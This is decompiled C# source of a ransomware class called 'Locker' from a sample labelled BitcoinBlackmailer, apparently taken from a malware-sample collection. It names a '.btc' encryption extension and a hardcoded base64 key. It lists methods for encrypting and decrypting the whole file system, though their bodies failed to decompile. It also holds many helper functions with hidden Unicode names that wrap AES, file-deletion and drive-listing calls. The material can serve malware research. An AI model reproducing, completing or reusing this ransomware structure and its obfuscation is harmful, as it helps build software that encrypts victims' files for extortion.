// Decompiled with JetBrains decompiler
// Type: Main.Tools.Locker
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 25D34CEB-BE06-4B6E-A57D-2F6CE77D45CE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-e8ac8a79bf4ec0cba992bbded2974968b9bcdadfafe08ed597e604e8099cd64c.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace Main.Tools
{
  internal static class Locker
  {
    private static readonly string EncryptedFileListPath;
    private static readonly HashSet<string> EncryptedFiles;
    private const string EncryptionFileExtension = ".btc";
    private const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

    internal static void EncryptFileSystem()
    {
      // ISSUE: unable to decompile the method.
    }

    internal static HashSet<string> GetEncryptedFiles()
    {
      // ISSUE: unable to decompile the method.
    }

    private static string CreateFileSystemSimulation()
    {
      // ISSUE: unable to decompile the method.
    }

    private static IEnumerable<string> GetExtensionsToEncrypt()
    {
      // ISSUE: unable to decompile the method.
    }

    private static IEnumerable<string> GetFiles(string path)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void EncryptFiles(
      string dirPath,
      string encryptionExtension,
      HashSet<string> extensionsToEncrypt)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static void DecryptFiles(string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static bool EncryptFile(string path, string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void DecryptFile(string path, string encryptionExtension)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile)
    {
      // ISSUE: unable to decompile the method.
    }

    static Locker()
    {
      // ISSUE: unable to decompile the method.
    }

    static DriveInfo[] \u206A‬‍⁭‪‎​⁯‮⁪⁭⁯‮⁮‫‌‏‬⁫‮⁫⁫‌⁯‌⁮‎⁪‌⁪⁫⁬‌‏⁭‪‌⁫⁮‬‮() => DriveInfo.GetDrives();

    static bool \u206E​‭‌‬‭‏⁭⁫⁪‪‭⁯⁭⁯​‭⁬⁭⁯‭‏‫‪‌⁫⁯​‌‬‬‍‫⁫⁭⁯‍‍‌‏‮([In] IEnumerator obj0) => obj0.MoveNext();

    static void \u206B⁫⁪‍⁪‎‍‬‎​⁬⁯​⁯‮⁫‎‪‪‍‎‫‬⁮⁯‮‍⁭⁫‬‭⁫‍‭‭⁬‫‫⁮⁫‮([In] IDisposable obj0) => obj0.Dispose();

    static bool \u202A‌‎‭‏‏‭‌⁭​‍‌‌‏‌⁬‏‮‬⁪⁭‬⁪‎‫‎‎‪⁫⁫‎⁬⁯​​‏⁫‍‮‏‮([In] string obj0) => File.Exists(obj0);

    static void \u200F‭⁭⁯‏‎⁭‎‮‮‮⁭‮‭‪‍⁯⁯‮‫‭⁫⁮‮‏‏⁯‌‍‪⁯⁯‌‏‍⁭‎‏‮‮([In] string obj0, [In] string[] obj1) => File.WriteAllLines(obj0, obj1);

    static string[] \u206B‫‭‏‍⁮‬⁮‫⁭⁯‏‪⁮‫‬⁬⁫‬⁪‏⁫⁭‌‫‎​⁫‍‪‎⁯⁭⁭⁪⁭⁬⁫‎‎‮([In] string obj0) => File.ReadAllLines(obj0);

    static string \u200B‍⁬⁭⁫​⁫‍⁮⁯‭‭‌‮⁮⁭‏‬⁮⁯⁮⁮‮⁬‪⁪‭‫‭⁬‬⁪‭‍⁬⁭‭‍‮‏‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static bool \u202C⁭‬⁬‎‪⁪‫⁫‏‬⁯‬‪‬‎⁯‫​‎⁫‌‭‮​⁯‫⁭‪‎‭‏⁪‎‏⁭⁯‎​‬‮([In] string obj0) => Directory.Exists(obj0);

    static DirectoryInfo \u202C‭‎⁪‏‏‫⁪​‭‭‪‎‍‌⁬⁬‮‫‍‌⁭‎‬⁯‭‌‬⁯⁪‌​‫‬‫‫​⁭‏⁪‮([In] string obj0) => Directory.CreateDirectory(obj0);

    static StreamWriter \u202E⁪‮‬‫‎‫‮⁬‌‏⁪⁪‏⁪‮⁫‭⁮⁯‌​⁬‬⁯‬‪⁬‏⁭‫‬‬‮‬‪​⁬‌‏‮(
      [In] string obj0,
      [In] bool obj1)
    {
      return new StreamWriter(obj0, obj1);
    }

    static void \u200B‫⁮‏⁫‪‪⁫‮⁬‏‭‍‌⁬⁮‌⁯‏⁬‪​⁮‫‫⁭‬‭​‌‪‌​‏⁬⁭⁬⁬⁪⁭‮([In] TextWriter obj0, [In] string obj1) => obj0.WriteLine(obj1);

    static string \u202B‬⁬⁭‬‌‮‌​⁫‏‭⁮‎‬⁮⁯‭⁮‍‌⁫‏⁬‎⁭‮⁯‌‪​⁮‎⁯‭⁬⁯‬‍‍‮() => Environment.NewLine;

    static string[] \u206B‪‏‌‏⁬⁬‮‬‌‎‫⁫​⁬⁬‎⁯‌‫‮⁪‍⁪⁫‮‏⁭‌‪‫‫‎‮⁪⁪⁬‎⁮‏‮(
      [In] string obj0,
      [In] string[] obj1,
      [In] StringSplitOptions obj2)
    {
      return obj0.Split(obj1, obj2);
    }

    static string \u202E⁭‎⁯‭‫‭⁫⁯⁪⁭⁭‪‫⁮‍‮‍⁯‮‬⁪‫⁭‪‬⁬‌‮​⁫⁭⁮‭⁭⁭⁮‮‌‎‮([In] string obj0) => obj0.Trim();

    static string \u206A⁮​​‍‭‫‎​‭⁪⁪⁬⁯‬⁯‌‍‭‏‮‎⁪⁫⁪⁭⁯‫‏​‏‫‬⁭‏⁫⁫‏‭⁪‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static void \u202A⁫⁫‍⁪⁫‬‏​‪⁯⁭‮⁮​⁭‏‌⁮‏‫‌‫‫‮​‎⁬‪​‭‎​⁮‌⁬⁬⁮‏⁪‮([In] string obj0) => File.Delete(obj0);

    static bool \u206A⁮⁮‭⁮‭⁯⁫‭‬‏‬‌‫⁫⁪‬⁪⁮‬‫⁯⁪‭​⁯⁯‮‍⁪⁪⁮‍‮⁮‪⁫⁮⁭‭‮(
      [In] string obj0,
      [In] string obj1,
      [In] StringComparison obj2)
    {
      return obj0.StartsWith(obj1, obj2);
    }

    static AesCryptoServiceProvider \u206B⁫⁮‏‭​⁮⁪⁯⁮⁮⁯​‪⁬‎‌⁯‭⁬‪⁬⁯​‍⁫‮‭‮⁪⁬‏⁮‏‏⁯‎‮⁪‮‮() => new AesCryptoServiceProvider();

    static byte[] \u202C⁫‮⁮‬‏⁮‫​⁭‌⁮‬⁪‫⁫⁮⁮‫⁪⁬‎‭‪‫⁯‭‌‪⁮‫‍⁯‬‭‬‌‫⁬‍‮([In] string obj0) => Convert.FromBase64String(obj0);

    static void \u206B‪‬‪‮‪‭⁮‮​⁪​‮⁯⁪‭‮⁮‭‪⁯‎‭⁬‍‮⁬‎‭‮‪‫⁯‪‮‫‎⁮⁬‮‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.Key = obj1;

    static void \u206B‬⁯‮‍‮​‏⁫‏‪⁬‏‍‏⁭⁯⁮‬⁯‬⁫‬‏‍⁪⁭⁬⁮‎⁫‌⁫‏⁭‏‪⁯‍⁭‮([In] Array obj0, [In] RuntimeFieldHandle obj1) => RuntimeHelpers.InitializeArray(obj0, obj1);

    static void \u206E⁮‍⁬⁮‪⁮⁮‫‌‬‫​⁪⁬⁬⁮⁪⁮‫⁭⁮⁭‬‍‭⁯⁮⁬⁭⁯‫⁭‌‎⁮⁪⁫‌‫‮([In] SymmetricAlgorithm obj0, [In] byte[] obj1) => obj0.IV = obj1;

    static bool \u202B⁮⁭‎‍‎‌‏​‌‍‎‮⁬‭⁫⁬‮⁫⁭‌‍⁫⁫‎‮⁭‫‭‏‏‍⁬​⁯‬⁫‎⁬⁭‮([In] string obj0, [In] string obj1) => obj0.EndsWith(obj1);

    static int \u200C‌⁮‫⁫‭​‍‍⁮‫‫‏‮​⁯‎‪‬⁬⁭⁮‮‎‭‭⁫‌‏⁭⁫​⁮⁬⁯‪‏‭⁮⁬‮([In] string obj0) => obj0.Length;

    static string \u206F⁮‌‫‏⁪‏⁫⁮‮⁪⁭⁭‭‌⁮​‪‌‌​‎‬​‭⁫‫‫⁪⁫⁪‬‫‬‏‎⁬⁫⁪‬‮([In] string obj0, [In] int obj1) => obj0.Remove(obj1);

    static FileStream \u206B⁫⁫‏‬‮⁬⁭‫⁮⁬​⁬​‪⁮‪⁮⁪⁭⁮​​⁯⁬⁫⁪⁫⁮‫⁯‮⁫⁪‍⁪‭⁪​⁬‮(
      [In] string obj0,
      [In] FileMode obj1)
    {
      return new FileStream(obj0, obj1);
    }

    static ICryptoTransform \u202A⁪⁯‮‍⁫⁭‪⁬‎‏⁫‍‮⁬‌⁬‏⁯⁮‌‏⁮⁭‬‪⁮⁫‫‭‭‮​‫⁬⁪‫‬‏⁪‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateEncryptor();
    }

    static CryptoStream \u200D‭⁮⁪​‍‭‌‭⁮⁪⁫​‏⁮‌‎‌⁪‪‬‬⁭⁪‌‍‮⁮‏‌‭‭⁪‌⁯‏⁪⁮‭‮(
      [In] Stream obj0,
      [In] ICryptoTransform obj1,
      [In] CryptoStreamMode obj2)
    {
      return new CryptoStream(obj0, obj1, obj2);
    }

    static int \u200E⁭‬‪⁫‏‬‎‍‌⁭‮‮‫‏‏⁮⁭‎⁯⁯‭⁭‪‫‪‎⁭⁭‬​‫‏⁪‍‫‬‏⁫⁬‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      return obj0.Read(obj1, obj2, obj3);
    }

    static void \u206C‌‪⁭​‮‪‏‏‎‫⁪⁬‏‪⁮⁫⁭⁫⁭⁯‭⁪‫‎‎‎‭‬‌⁪‪‫‌⁯‌⁪⁮⁮‍‮(
      [In] Stream obj0,
      [In] byte[] obj1,
      [In] int obj2,
      [In] int obj3)
    {
      obj0.Write(obj1, obj2, obj3);
    }

    static ICryptoTransform \u202A⁬⁬⁯‭⁯‎‎⁫⁭⁬‏‍‫⁭‭⁯⁮‮​⁯‎⁬‎⁮‮‎⁬‪‪‬‫‪‮⁭⁮⁬⁮⁭‍‮(
      [In] SymmetricAlgorithm obj0)
    {
      return obj0.CreateDecryptor();
    }
  }
}
